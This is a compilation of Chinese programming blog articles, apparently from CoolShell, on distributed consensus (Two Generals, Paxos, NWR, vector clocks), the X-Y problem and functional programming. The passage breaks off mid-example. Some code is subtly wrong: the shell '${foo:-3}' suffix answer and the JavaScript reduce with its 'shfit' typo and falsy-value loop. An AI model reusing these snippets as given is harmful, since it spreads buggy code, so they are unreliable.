[Two Generals Problem](https://en.wikipedia.org/wiki/Two_Generals'_Problem) 两将军问题是这么一个思维性实验问题： 有两支军队，它们分别有一位将军领导，现在准备攻击一座修筑了防御工事的城市。这两支军队都驻扎在那座城市的附近，分占一座山头。一道山谷把两座山分隔开来，并且两位将军唯一的通信方式就是派各自的信使来往于山谷两边。不幸的是，这个山谷已经被那座城市的保卫者占领，并且存在一种可能，那就是任何被派出的信使通过山谷是会被捕。 请注意，虽然两位将军已经就攻击那座城市达成共识，但在他们各自占领山头阵地之前，并没有就进攻时间达成共识。两位将军必须让自己的军队同时进攻城市才能取得成功。因此，他们必须互相沟通，以确定一个时间来攻击，并同意就在那时攻击。如果只有一个将军进行攻击，那么这将是一个灾难性的失败。 这个思维实验就包括考虑他们如何去做这件事情。下面是我们的思考：

1）第一位将军先发送一段消息“让我们在上午9点开始进攻”。然而，一旦信使被派遣，他是否通过了山谷，第一位将军就不得而知了。任何一点的不确定性都会使得第一位将军攻击犹豫，因为如果第二位将军不能在同一时刻发动攻击，那座城市的驻军就会击退他的军队的进攻，导致他的军对被摧毁。

2）知道了这一点，第二位将军就需要发送一个确认回条：“我收到您的邮件，并会在9点的攻击。”但是，如果带着确认消息的信使被抓怎么办？所以第二位将军会犹豫自己的确认消息是否能到达。

3）于是，似乎我们还要让第一位将军再发送一条确认消息——“我收到了你的确认”。然而，如果这位信使被抓怎么办呢？

4）这样一来，是不是我们还要第二位将军发送一个“确认收到你的确认”的信息。

靠，于是你会发现，这事情很快就发展成为不管发送多少个确认消息，都没有办法来保证两位将军有足够的自信自己的信使没有被敌军捕获。

![img](photo/two-generals-problems.jpg)

**这个问题是无解的**。两个将军问题和它的无解证明首先由E.A.Akkoyunlu,K.Ekanadham和R.V.Huber于1975年在《一些限制与折衷的网络通信设计》一文中发表，就在这篇文章的第73页中一段描述两个黑帮之间的通信中被阐明。 1978年，在Jim Gray的《数据库操作系统注意事项》一书中（从第465页开始）被命名为两个将军悖论。作为两个将军问题的定义和无解性的证明的来源，这一参考被广泛提及。

这个实验意在阐明：试图通过建立在一个不可靠的连接上的交流来协调一项行动的隐患和设计上的巨大挑战。

从工程上来说，一个解决两个将军问题的实际方法是使用一个能够承受通信信道不可靠性的方案，并不试图去消除这个不可靠性，但要将不可靠性削减到一个可以接受的程度。比如，第一位将军排出了100位信使并预计他们都被捕的可能性很小。在这种情况下，不管第二位将军是否会攻击或者受到任何消息，第一位将军都会进行攻击。另外，第一位将军可以发送一个消息流，而第二位将军可以对其中的每一条消息发送一个确认消息，这样如果每条消息都被接收到，两位将军会感觉更好。然而我们可以从证明中看出，他们俩都不能肯定这个攻击是可以协调的。他们没有算法可用（比如，收到4条以上的消息就攻击）能够确保防止仅有一方攻击。再者，第一位将军还可以为每条消息编号，说这是1号，2号……直到n号。这种方法能让第二位将军知道通信信道到底有多可靠，并且返回合适的数量的消息来确保最后一条消息被接收到。如果信道是可靠的话，只要一条消息就行了，其余的就帮不上什么忙了。最后一条和第一条消息丢失的概率是相等的。

 两将军问题可以扩展成更变态的**拜占庭将军问题 (Byzantine Generals Problem)**，其故事背景是这样的：拜占庭位于现在土耳其的伊斯坦布尔，是东罗马帝国的首都。由于当时拜占庭罗马帝国国土辽阔，为了防御目的，因此每个军队都分隔很远，将军与将军之间只能靠信差传消息。 在战争的时候，拜占庭军队内所有将军必需达成一致的共识，决定是否有赢的机会才去攻打敌人的阵营。但是，军队可能有叛徒和敌军间谍，这些叛徒将军们会扰乱或左右决策的过程。这时候，在已知有成员谋反的情况下，其余忠诚的将军在不受叛徒的影响下如何达成一致的协议，这就是拜占庭将军问题。

#### Paxos算法

[Wikipedia上的各种Paxos算法](https://en.wikipedia.org/wiki/Paxos_(computer_science))的描述非常详细，大家可以去围观一下。

Paxos 算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个「一致性算法」以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。从20世纪80年代起对于一致性算法的研究就没有停止过。

**Notes**：Paxos算法是莱斯利·兰伯特（Leslie Lamport，就是 LaTeX 中的”La”，此人现在在微软研究院）于1990年提出的一种基于消息传递的一致性算法。由于算法难以理解起初并没有引起人们的重视，使Lamport在八年后1998年重新发表到ACM Transactions on Computer Systems上（[The Part-Time Parliament](http://research.microsoft.com/users/lamport/pubs/lamport-paxos.pdf)）。即便如此paxos算法还是没有得到重视，2001年Lamport 觉得同行无法接受他的幽默感，于是用容易接受的方法重新表述了一遍（[Paxos Made Simple](http://research.microsoft.com/users/lamport/pubs/paxos-simple.pdf)）。可见Lamport对Paxos算法情有独钟。近几年Paxos算法的普遍使用也证明它在分布式一致性算法中的重要地位。2006年Google的三篇论文初现“云”的端倪，其中的Chubby Lock服务使用Paxos作为Chubby Cell中的一致性算法，Paxos的人气从此一路狂飙。（Lamport 本人在 [他的blog 中](http://research.microsoft.com/users/lamport/pubs/pubs.html#lamport-paxos)描写了他用9年时间发表这个算法的前前后后）

注：Amazon的AWS中，所有的云服务都基于一个ALF（Async Lock Framework）的框架实现的，这个ALF用的就是Paxos算法。我在Amazon的时候，看内部的分享视频时，设计者在内部的Principle Talk里说他参考了ZooKeeper的方法，但他用了另一种比ZooKeeper更易读的方式实现了这个算法。

简单说来，Paxos的目的是让整个集群的结点对某个值的变更达成一致。Paxos算法基本上来说是个民主选举的算法——大多数的决定会成个整个集群的统一决定。任何一个点都可以提出要修改某个数据的提案，是否通过这个提案取决于这个集群中是否有超过半数的结点同意（所以Paxos算法需要集群中的结点是单数）。

这个算法有两个阶段（假设这个有三个结点：A，B，C）：

**第一阶段：Prepare阶段**

A把申请修改的请求Prepare Request发给所有的结点A，B，C。注意，Paxos算法会有一个Sequence Number（你可以认为是一个提案号，这个数不断递增，而且是唯一的，也就是说A和B不可能有相同的提案号），这个提案号会和修改请求一同发出，任何结点在“Prepare阶段”时都会拒绝其值小于当前提案号的请求。所以，结点A在向所有结点申请修改请求的时候，需要带一个提案号，越新的提案，这个提案号就越是是最大的。

如果接收结点收到的提案号n大于其它结点发过来的提案号，这个结点会回应Yes（本结点上最新的被批准提案号），并保证不接收其它<n的提案。这样一来，结点上在Prepare阶段里总是会对最新的提案做承诺。

优化：在上述 prepare 过程中，如果任何一个结点发现存在一个更高编号的提案，则需要通知 提案人，提醒其中断这次提案。

**第二阶段：Accept阶段**

如果提案者A收到了超过半数的结点返回的Yes，然后他就会向所有的结点发布Accept Request（同样，需要带上提案号n），如果没有超过半数的话，那就返回失败。

当结点们收到了Accept Request后，如果对于接收的结点来说，n是最大的了，那么，它就会修改这个值，如果发现自己有一个更大的提案号，那么，结点就会拒绝修改。

我们可以看以，这似乎就是一个“两段提交”的优化。其实，**2PC/3PC都是分布式一致性算法的残次版本，Google Chubby的作者Mike Burrows说过这个世界上只有一种一致性算法，那就是Paxos，其它的算法都是残次品。**

我们还可以看到：对于同一个值的在不同结点的修改提案就算是在接收方被乱序收到也是没有问题的。

关于一些实例，你可以看一下Wikipedia中文中的“[Paxos样例](https://zh.wikipedia.org/zh/Paxos算法#.E5.AE.9E.E4.BE.8B)”一节，我在这里就不再多说了。对于Paxos算法中的一些异常示例，大家可以自己推导一下。你会发现基本上来说只要保证有半数以上的结点存活，就没有什么问题。

多说一下，自从Lamport在1998年发表Paxos算法后，对Paxos的各种改进工作就从未停止，其中动作最大的莫过于2005年发表的[Fast Paxos](http://research.microsoft.com/apps/pubs/default.aspx?id=64624)。无论何种改进，其重点依然是在消息延迟与性能、吞吐量之间作出各种权衡。为了容易地从概念上区分二者，称前者Classic Paxos，改进后的后者为Fast Paxos。

#### 总结

下图来自：Google App Engine的co-founder Ryan Barrett在2009年的google i/o上的演讲《[Transaction Across DataCenter](http://snarfed.org/transactions_across_datacenters_io.html)》（视频： [http://www.youtube.com/watch?v=srOgpXECblk](https://www.youtube.com/watch?v=srOgpXECblk)）

![img](photo/Transaction-Across-DataCenter-1684153726807-835.jpg)

前面，我们说过，要想让数据有高可用性，就需要冗余数据写多份。写多份的问题会带来一致性的问题，而一致性的问题又会带来性能问题。从上图我们可以看到，我们基本上来说不可以让所有的项都绿起来，这就是著名的CAP理论：一致性，可用性，分区容忍性，你只可能要其中的两个。

#### NWR模型

**最后我还想提一下Amazon Dynamo的NWR模型。这个NWR模型把CAP的选择权交给了用户，让用户自己的选择你的CAP中的哪两个**。

所谓NWR模型。N代表N个备份，W代表要写入至少W份才认为成功，R表示至少读取R个备份。**配置的时候要求W+R > N**。 因为W+R > N， 所以 R > N-W 这个是什么意思呢？就是读取的份数一定要比总备份数减去确保写成功的倍数的差值要大。

也就是说，每次读取，都至少读取到一个最新的版本。从而不会读到一份旧数据。当我们需要高可写的环境的时候，我们可以配置W = 1 如果N=3 那么R = 3。 这个时候只要写任何节点成功就认为成功，但是读的时候必须从所有的节点都读出数据。如果我们要求读的高效率，我们可以配置 W=N R=1。这个时候任何一个节点读成功就认为成功，但是写的时候必须写所有三个节点成功才认为成功。

NWR模型的一些设置会造成脏数据的问题，因为这很明显不是像Paxos一样是一个强一致的东西，所以，可能每次的读写操作都不在同一个结点上，于是会出现一些结点上的数据并不是最新版本，但却进行了最新的操作。

所以，Amazon Dynamo引了数据版本的设计。也就是说，如果你读出来数据的版本是v1，当你计算完成后要回填数据后，却发现数据的版本号已经被人更新成了v2，那么服务器就会拒绝你。版本这个事就像“乐观锁”一样。

但是，对于分布式和NWR模型来说，版本也会有恶梦的时候——就是版本冲的问题，比如：我们设置了N=3 W=1，如果A结点上接受了一个值，版本由v1 -> v2，但还没有来得及同步到结点B上（异步的，应该W=1，写一份就算成功），B结点上还是v1版本，此时，B结点接到写请求，按道理来说，他需要拒绝掉，但是他一方面并不知道别的结点已经被更新到v2，另一方面他也无法拒绝，因为W=1，所以写一分就成功了。于是，出现了严重的版本冲突。

Amazon的Dynamo把版本冲突这个问题巧妙地回避掉了——版本冲这个事交给用户自己来处理。

于是，Dynamo引入了Vector Clock（矢量钟？!）这个设计。这个设计让每个结点各自记录自己的版本信息，也就是说，对于同一个数据，需要记录两个事：1）谁更新的我，2）我的版本号是什么。

下面，我们来看一个操作序列：

1）一个写请求，第一次被节点A处理了。节点A会增加一个版本信息(A，1)。我们把这个时候的数据记做D1(A，1)。 然后另外一个对同样key的请求还是被A处理了于是有D2(A，2)。这个时候，D2是可以覆盖D1的，不会有冲突产生。

2）现在我们假设D2传播到了所有节点(B和C)，B和C收到的数据不是从客户产生的，而是别人复制给他们的，所以他们不产生新的版本信息，所以现在B和C所持有的数据还是D2(A，2)。于是A，B，C上的数据及其版本号都是一样的。

3）如果我们有一个新的写请求到了B结点上，于是B结点生成数据D3(A,2; B,1)，意思是：数据D全局版本号为3，A升了两新，B升了一次。这不就是所谓的代码版本的log么？

4）如果D3没有传播到C的时候又一个请求被C处理了，于是，以C结点上的数据是D4(A,2; C,1)。

5）好，最精彩的事情来了：如果这个时候来了一个读请求，我们要记得，我们的W=1 那么R=N=3，所以R会从所有三个节点上读，此时，他会读到三个版本：

- - A结点：D2(A,2)
  - B结点：D3(A,2;  B,1);
  - C结点：D4(A,2;  C,1)

6）这个时候可以判断出，D2已经是旧版本（已经包含在D3/D4中），可以舍弃。

7）但是D3和D4是明显的版本冲突。于是，交给调用方自己去做版本冲突处理。就像源代码版本管理一样。

很明显，上述的Dynamo的配置用的是CAP里的A和P。

我非常推大家都去看看这篇论文：《[Dynamo：Amazon’s Highly Available Key-Value Store](http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/decandia07dynamo.pdf)》，如果英文痛苦，你可以[看看译文](http://vdisk.weibo.com/s/AKRQZMLLc1ol)（译者不详）。

（全文完）

# X-Y PROBLEM

#####  [2013年12月16日 ](https://coolshell.cn/articles/10804.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [135 条评论](https://coolshell.cn/articles/10804.html#comments) 170,787 人阅读



#### ![img](photo/x-y.problem-231x300.jpg)X-Y Problem

对于X-Y Problem的意思如下：

1）有人想解决问题X
2）他觉得Y可能是解决X问题的方法
3）但是他不知道Y应该怎么做
4）于是他去问别人Y应该怎么做？

简而言之，**没有去问怎么解决问题X，而是去问解决方案Y应该怎么去实现和操作**。于是乎：

1）热心的人们帮助并告诉这个人Y应该怎么搞，但是大家都觉得Y这个方案有点怪异。
2）在经过大量地讨论和浪费了大量的时间后，热心的人终于明白了原始的问题X是怎么一回事。
3）于是大家都发现，Y根本就不是用来解决X的合适的方案。

X-Y Problem最大的严重的问题就是：**在一个根本错误的方向上浪费他人大量的时间和精力**！

#### 示例

举个两个例子：

> Q) 我怎么用Shell取得一个字符串的后3位字符？
> A1) 如果这个字符的变量是$foo，你可以这样来 echo ${foo:-3}
> A2) 为什么你要取后3位？你想干什么？
> Q) 其实我就想取文件的扩展名
> A1) 我靠，原来你要干这事，那我的方法不对，文件的扩展名并不保证一定有3位啊。
> A1) 如果你的文件必然有扩展名的话，你可以这来样来：echo ${foo##*.}



再来一个示例：

> Q）问一下大家，我如何得到一个文件的大小
> A1)  size = `ls -l $file  | awk '{print $5}'`
> Q) 哦，要是这个文件名是个目录呢？
> A2) 用du吧
> A3) 不好意思，你到底是要文件的大小还是目录的大小？你到底要干什么？
> Q)  我想把一个目录下的每个文件的每个块（第一个块有512个字节）拿出来做md5，并且计算他们的大小 ……
> A1) 哦，你可以使用dd吧。
> A2) dd不行吧。
> A3) 你用md5来计算这些块的目的是什么？你究竟想干什么啊？
> Q) 其实，我想写一个网盘，对于小文件就直接传输了，对于大文件我想分块做增量同步。
> A2) 用rsync啊，你妹！

[这里有篇文章](http://www.perlmonks.org/index.pl?node_id=542341)说明了X-Y Problem的各种案例说明，我从其中摘出三个来让大家看看：

> 你试图做X，并想到了用Y方案。所以你去问别人Y，但根本不提X。于是，你可以会错过本来可能有更好更适合的方案，除非你告诉大家X是什么。
>
> — *from [Re: How do I keep the command line from eating the backslashes?](http://www.perlmonks.org/index.pl?node_id=430320) by [revdiablo](http://www.perlmonks.org/index.pl?node_id=163683)*

> 有些人问怎么做Y，但其它他想做的是X。他问怎么做Y是因为他觉得Y是最好搞定X的方法。 于是大家不断地回答“试试这个，试试那个”来帮助他，而他总是在说“这个有问题，那个有问题，因为……”。基本不同的情况，其它的方案可能会更好。
>
> — *from [Re: Re: Re: Re: regex to validate e-mail addresses and phone numbers](http://www.perlmonks.org/index.pl?node_id=327963) by [Limbic~Region](http://www.perlmonks.org/index.pl?node_id=180961)*

> X-Y Problem又叫“过早下结论”：提问者其实并不非常清楚想要解决的X问题，他猜测用Y可以搞定，于是他问大家如何实现Y。
>
> — *from [](https://groups.google.com/groups?hl=en&selm=Pine.GHP.4.21.0009061210570.8800-100000@hpplus03.cern.ch) by Alan J. Flavell*

其实这个问题在我之前的《[你会问问题吗](https://coolshell.cn/articles/3713.html)》里提到的那篇How To Ask Questions the Smart Way中的提到过，你可以[移步去看一下](http://www.beiww.com/doc/oss/smart-questions.html#id265951)。

所以，我们在寻求别人帮助的时候，最好把我们想解决的问题和整个事情的来龙去脉说清楚。

#### 一些变种

我们不要以为X-Y Problem就像上面那样的简单，我们不会出现，其实我们生活的这个世界有有各种X-Y Problem的变种。下面我个人觉得非常像XY Problem的总是：

其一、大多数人有时候，非常容易把手段当目的，他们会用自己所喜欢的技术和方法来反推用户的需求，于是很有可能就会出现X-Y Problem – 也许解决用户需求最适合的技术方案是PC，但是我们要让他们用手机。

其二、产品经理有时候并不清楚他想解决的用户需求是什么，于是他觉得可能开发Y的功能能够满足用户，于是他提出了Y的需求让技术人员去做，但那根本不是解决X问题的最佳方案。

其三、因为公司或部门的一些战略安排，业务部门设计了相关的业务规划，然后这些业务规划更多的是公司想要的Y，而不是解决用户的X问题。

其四、对于个人的职业发展，X是成长为有更强的技能和能力，这个可以拥有比别人更强的竞争力，从而可以有更好的报酬，但确走向了Y：全身心地追逐KPI。

其五、本来我们想达成的X是做出更好和更有价值的产品，但最终走到了Y：通过各种手段提升安装量，点击量，在线量，用户量来衡量。

其六、很多团队Leader都喜欢制造信息不平等，并不告诉团队某个事情的来由，掩盖X，而直接把要做的Y告诉团队，导致团队并不真正地理解，而产生了很多时间和经历的浪费。

所有的这些，在我心中都是X-Y Problem的变种，这是不是一种刻舟求剑的表现？

#### 参考

- [StackOverflow: What is XY Problem?](http://meta.stackoverflow.com/questions/66377/what-is-the-xy-problem)
- [PerlMonks: XY Problem](http://www.perlmonks.org/?node_id=542341)
- [Greg’s Wiki](http://mywiki.wooledge.org/XyProblem)

（全文完）

# 函数式编程

#####  [2013年12月27日 ](https://coolshell.cn/articles/10822.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [194 条评论](https://coolshell.cn/articles/10822.html#comments) 214,540 人阅读

![img](photo/yoda-lambda-204x300.png)当我们说起函数式编程来说，我们会看到如下函数式编程的长相：

- 函数式编程的三大特性：
  - **immutable data 不可变数据**：像Clojure一样，默认上变量是不可变的，如果你要改变变量，你需要把变量copy出去修改。这样一来，可以让你的程序少很多Bug。因为，程序中的状态不好维护，在并发的时候更不好维护。（你可以试想一下如果你的程序有个复杂的状态，当以后别人改你代码的时候，是很容易出bug的，在并行中这样的问题就更多了）
  - **first class functions**：这个技术可以让你的函数就像变量一样来使用。也就是说，你的函数可以像变量一样被创建，修改，并当成变量一样传递，返回或是在函数中嵌套函数。这个有点像Javascript的Prototype（参看[Javascript的面向对象编程](https://coolshell.cn/articles/6668.html)）
  - **尾递归优化**：我们知道递归的害处，那就是如果递归很深的话，stack受不了，并会导致性能大幅度下降。所以，我们使用尾递归优化技术——每次递归时都会重用stack，这样一来能够提升性能，当然，这需要语言或编译器的支持。Python就不支持。

- 函数式编程的几个技术
  - **map & reduce** ：这个技术不用多说了，函数式编程最常见的技术就是对一个集合做Map和Reduce操作。这比起过程式的语言来说，在代码上要更容易阅读。（传统过程式的语言需要使用for/while循环，然后在各种变量中把数据倒过来倒过去的）这个很像C++中的STL中的foreach，find_if，count_if之流的函数的玩法。
  - **pipeline**：这个技术的意思是，把函数实例成一个一个的action，然后，把一组action放到一个数组或是列表中，然后把数据传给这个action list，数据就像一个pipeline一样顺序地被各个函数所操作，最终得到我们想要的结果。
  - **recursing 递归** ：递归最大的好处就简化代码，他可以把一个复杂的问题用很简单的代码描述出来。注意：递归的精髓是描述问题，而这正是函数式编程的精髓。
  - **currying**：把一个函数的多个参数分解成多个函数， 然后把函数多层封装起来，每层函数都返回一个函数去接收下一个参数这样，可以简化函数的多个参数。在C++中，这个很像STL中的bind_1st或是bind2nd。
  - **higher order function 高阶函数**：所谓高阶函数就是函数当参数，把传入的函数做一个封装，然后返回这个封装函数。现象上就是函数传进传出，就像面向对象对象满天飞一样。



- 还有函数式的一些好处
  - **parallelization 并行：**所谓并行的意思就是在并行环境下，各个线程之间不需要同步或互斥。
  - **lazy evaluation 惰性求值**：这个需要编译器的支持。表达式不在它被绑定到变量之后就立即求值，而是在该值被取用的时候求值，也就是说，语句如*x:=expression;* (把一个表达式的结果赋值给一个变量)明显的调用这个表达式被计算并把结果放置到 *x* 中，但是先不管实际在 *x* 中的是什么，直到通过后面的表达式中到 *x* 的引用而有了对它的值的需求的时候，而后面表达式自身的求值也可以被延迟，最终为了生成让外界看到的某个符号而计算这个快速增长的依赖树。
  - **determinism 确定性**：所谓确定性的意思就是像数学那样 f(x) = y ，这个函数无论在什么场景下，都会得到同样的结果，这个我们称之为函数的确定性。而不是像程序中的很多函数那样，同一个参数，却会在不同的场景下计算出不同的结果。所谓不同的场景的意思就是我们的函数会根据一些运行中的状态信息的不同而发生变化。

上面的那些东西太抽象了，还是让我们来循序渐近地看一些例子吧。

我们先用一个最简单的例子来说明一下什么是函数式编程。

先看一个非函数式的例子：

**int** cnt;

**void** increment(){

​    cnt++;

}

 

那么，函数式的应该怎么写呢？

**int** increment(**int** cnt){

​    **return** cnt+1;

}

你可能会觉得这个例子太普通了。是的，这个例子就是函数式编程的准则：**不依赖于外部的数据，而且也不改变外部数据的值，而是返回一个新的值给你**。

我们再来看一个简单例子：

**def** inc(x):

​    **def** incx(y):

​        **return** x+y

​    **return** incx

inc2 = inc(2)

inc5 = inc(5)

print inc2(5) # 输出 7

print inc5(5) # 输出 10

我们可以看到上面那个例子inc()函数返回了另一个函数incx()，于是我们可以用inc()函数来构造各种版本的inc函数，比如：inc2()和inc5()。这个技术其实就是上面所说的Currying技术。从这个技术上，你可能体会到函数式编程的理念：**把函数当成变量来用，关注于描述问题而不是怎么实现**，这样可以让代码更易读。

目录



[Map & Reduce](https://coolshell.cn/articles/10822.html#Map_Reduce)[Declarative Programming vs Imperative Programming](https://coolshell.cn/articles/10822.html#Declarative_Programming_vs_Imperative_Programming)[Pipeline](https://coolshell.cn/articles/10822.html#Pipeline)[参考](https://coolshell.cn/articles/10822.html#参考)

#### Map & Reduce

在函数式编程中，我们不应该用循环迭代的方式，我们应该用更为高级的方法，如下所示的Python代码

name_len = map(len, ["hao", "chen", "coolshell"])

print name_len

\# 输出 [3, 4, 9]

你可以看到这样的代码很易读，因为，**这样的代码是在描述要干什么，而不是怎么干**。

我们再来看一个Python代码的例子：

**def** toUpper(item):

**return** item.upper()

upper_name = map(toUpper, ["hao", "chen", "coolshell"])

print upper_name

\# 输出 ['HAO', 'CHEN', 'COOLSHELL']

顺便说一下，上面的例子个是不是和我们的STL的transform有些像？

**#include <iostream>**

**#include <algorithm>**

**#include <string>**

**using** **namespace** std;

**int** main() {

​    string s="hello";

​    string out;

​    transform(s.begin(), s.end(), back_inserter(out), ::toupper);

​    cout << out << endl;

​    // 输出：HELLO

}

在上面Python的那个例子中我们可以看到，我们写义了一个函数toUpper，这个函数没有改变传进来的值，只是把传进来的值做个简单的操作，然后返回。然后，我们把其用在map函数中，就可以很清楚地描述出我们想要干什么。而不会去理解一个在循环中的怎么实现的代码，最终在读了很多循环的逻辑后才发现原来是这个或那个意思。 下面，我们看看描述实现方法的过程式编程是怎么玩的（看上去是不是不如函数式的清晰？）：

upname =['HAO', 'CHEN', 'COOLSHELL']

lowname =[]

**for** i **in** range(len(upname)):

lowname.append( upname[i].lower() )

对于map我们别忘了lambda表达式：你可以简单地理解为这是一个inline的匿名函数。下面的lambda表达式相当于：def func(x): return x*x

squares = map(**lambda** x: x * x, range(9))

print squares

\# 输出 [0, 1, 4, 9, 16, 25, 36, 49, 64]

我们再来看看reduce怎么玩？（下面的lambda表达式中有两个参数，也就是说每次从列表中取两个值，计算结果后把这个值再放回去，下面的表达式相当于：`((((1+2)+3)+4)+5) ）`

print reduce(**lambda** x, y: x+y, [1, 2, 3, 4, 5])

\# 输出 15

Python中的除了map和reduce外，还有一些别的如filter, find, all, any的函数做辅助（其它函数式的语言也有），可以让你的代码更简洁，更易读。 我们再来看一个比较复杂的例子：

\# 计算数组中正数的平均值",

num =[2, -5, 9, 7, -2, 5, 3, 1, 0, -3, 8]

positive_num_cnt = 0

positive_num_sum = 0

**for** i **in** range(len(num)):

​    **if** num[i] > 0:

​        positive_num_cnt += 1

​        positive_num_sum += num[i]

**if** positive_num_cnt > 0:

​    average = positive_num_sum / positive_num_cnt

print average

\# 输出 5

如果用函数式编程，这个例子可以写成这样：

positive_num = filter(**lambda** x: x>0, num)

average = reduce(**lambda** x,y: x+y, positive_num) / len( positive_num )

C++11玩的法：

\#include <iostream>

\#include <algorithm>

\#include <numeric>

\#include <string>

\#include <vector>

using namespace std;

vector num {2, -5, 9, 7, -2, 5, 3, 1, 0, -3, 8};

vector p_num;

copy_if(num.begin(), num.end(), back_inserter(p_num), [](int i){ **return** (i>0);} );

int average = accumulate(p_num.begin(), p_num.end(), 0) / p_num.size();

cout << "averge: " << average << endl;

我们可以看到，函数式编程有如下好处：

1）代码更简单了。
2）数据集，操作，返回值都放到了一起。
3）你在读代码的时候，没有了循环体，于是就可以少了些临时变量，以及变量倒来倒去逻辑。
4）你的代码变成了在描述你要干什么，而不是怎么去干。

最后，我们来看一下Map/Reduce这样的函数是怎么来实现的（下面是Javascript代码）

//map函数

var map = **function** (mappingFunction, list) {

​    var result = [];

​    forEach(list, **function** (item) {

​        result.push(mappingFunction(item));

​    });

​    **return** result;

};

下面是reduce函数的javascript实现（谢谢 [@下雨在家](http://weibo.com/u/1772898707) 修正的我原来的简单版本）

//reduce函数

**function** reduce(actionFunction, list, initial){

​    var accumulate;

​    var temp;

​    **if**(initial){

​        accumulate = initial;

​    }**else**{

​        accumulate = list.shfit();

​    }

​    temp = list.shift();

​    **while**(temp){

​        accumulate = actionFunction(accumulate,temp);

​        temp = list.shift();

​    }

​    **return** accumulate;

};

#### Declarative Programming vs Imperative Programming

前面提到过多次的函数式编程关注的是：describe what to do, rather than how to do it. 于是，我们把以前的过程式的编程范式叫做 [Imperative Programming](https://en.wikipedia.org/wiki/Imperative_programming) – 指令式编程，而把函数式的这种范式叫做 [Declarative Programming](https://en.wikipedia.org/wiki/Declarative_programming) – 声明式编程。

下面我们看一下相关的示例（本示例来自[这篇文章](http://maryrosecook.com/post/a-practical-introduction-to-functional-programming) ）。

比如，我们有3辆车比赛，简单起见，我们分别给这3辆车有70%的概率可以往前走一步，一共有5次机会，我们打出每一次这3辆车的前行状态。

对于Imperative Programming来说，代码如下（Python）：

**from** random **import** random

time = 5

car_positions = [1, 1, 1]

**while** time:

​    \# decrease time

​    time -= 1

​    print ''

​    **for** i **in** range(len(car_positions)):

​        \# move car

​        **if** random() > 0.3:

​            car_positions[i] += 1

​        \# draw car

​        print '-' * car_positions[i]

我们可以把这个两重循环变成一些函数模块，这样有利于我们更容易地阅读代码：

**from** random **import** random

**def** move_cars():

​    **for** i, _ **in** enumerate(car_positions):

​        **if** random() > 0.3:

​            car_positions[i] += 1

**def** draw_car(car_position):

​    print '-' * car_position

**def** run_step_of_race():

​    **global** time

​    time -= 1

​    move_cars()

**def** draw():

​    print ''

​    **for** car_position **in** car_positions:

​        draw_car(car_position)

time = 5

car_positions = [1, 1, 1]

**while** time:

​    run_step_of_race()

​    draw()

上面的代码，我们可以从主循环开始，我们可以很清楚地看到程序的主干，因为我们把程序的逻辑分成了几个函数，这样一来，我们的代码逻辑也会变得几个小碎片，于是我们读代码时要考虑的上下文就少了很多，阅读代码也会更容易。不像第一个示例，如果没有注释和说明，你还是需要花些时间理解一下。**而把代码逻辑封装成了函数后，我们就相当于给每个相对独立的程序逻辑取了个名字，于是代码成了自解释的**。

但是，你会发现，封装成函数后，这些函数都会依赖于共享的变量来同步其状态。于是，我们在读代码的过程时，每当我们进入到函数里，一量读到访问了一个外部的变量，我们马上要去查看这个变量的上下文，然后还要在大脑里推演这个变量的状态， 我们才知道程序的真正逻辑。也就是说，**这些函数间必需知道其它函数是怎么修改它们之间的共享变量的，所以，这些函数是有状态的**。

我们知道，有状态并不是一件很好的事情，无论是对代码重用，还是对代码的并行来说，都是有副作用的。因此，我们要想个方法把这些状态搞掉，于是出现了我们的 Functional Programming 的编程范式。下面，我们来看看函数式的方式应该怎么写？

**from** random **import** random

**def** move_cars(car_positions):

​    **return** map(**lambda** x: x + 1 **if** random() > 0.3 **else** x,

​               car_positions)

**def** output_car(car_position):

​    **return** '-' * car_position

**def** run_step_of_race(state):

​    **return** {'time': state['time'] - 1,

​            'car_positions': move_cars(state['car_positions'])}

**def** draw(state):

​    print ''

​    print '\n'.join(map(output_car, state['car_positions']))

**def** race(state):

​    draw(state)

​    **if** state['time']:

​        race(run_step_of_race(state))

race({'time': 5,

​      'car_positions': [1, 1, 1]})

上面的代码依然把程序的逻辑分成了函数，不过这些函数都是functional的。因为它们有三个症状：

1）它们之间没有共享的变量。
2）函数间通过参数和返回值来传递数据。
3）在函数里没有临时变量。

我们还可以看到，for循环被递归取代了（见race函数）—— 递归是函数式编程中带用到的技术，正如前面所说的，递归的本质就是描述问题是什么。

![img](photo/forrest-gump.jpg)

#### Pipeline

pipeline 管道借鉴于Unix Shell的管道操作——把若干个命令串起来，前面命令的输出成为后面命令的输入，如此完成一个流式计算。（注：管道绝对是一个伟大的发明，他的设哲学就是KISS – 让每个功能就做一件事，并把这件事做到极致，软件或程序的拼装会变得更为简单和直观。这个设计理念影响非常深远，包括今天的Web Service，云计算，以及大数据的流式计算等等）

比如，我们如下的shell命令：

ps auwwx | awk '{print $2}' | sort -n | xargs echo

如果我们抽象成函数式的语言，就像下面这样：

xargs( echo, sort(n, awk('print $2', ps(auwwx))) )

也可以类似下面这个样子：

pids = for_each(result, [ps_auwwx, awk_p2, sort_n, xargs_echo])

好了，让我们来看看函数式编程的Pipeline怎么玩？

我们先来看一个如下的程序，这个程序的process()有三个步骤：

1）找出偶数。
2）乘以3
3）转成字符串返回

**def** process(num):

​    \# filter out non-evens

​    **if** num % 2 != 0:

​        **return**

​    num = num * 3

​    num = 'The Number: %s' % num

​    **return** num

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

**for** num **in** nums:

​    print process(num)

\# 输出：

\# None

\# The Number: 6

\# None

\# The Number: 12

\# None

\# The Number: 18

\# None

\# The Number: 24

\# None

\# The Number: 30

我们可以看到，输出的并不够完美，另外，代码阅读上如果没有注释，你也会比较晕。下面，我们来看看函数式的pipeline（第一种方式）应该怎么写？

**def** even_filter(nums):

​    **for** num **in** nums:

​        **if** num % 2 == 0:

​            **yield** num

**def** multiply_by_three(nums):

​    **for** num **in** nums:

​        **yield** num * 3

**def** convert_to_string(nums):

​    **for** num **in** nums:

​        **yield** 'The Number: %s' % num

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

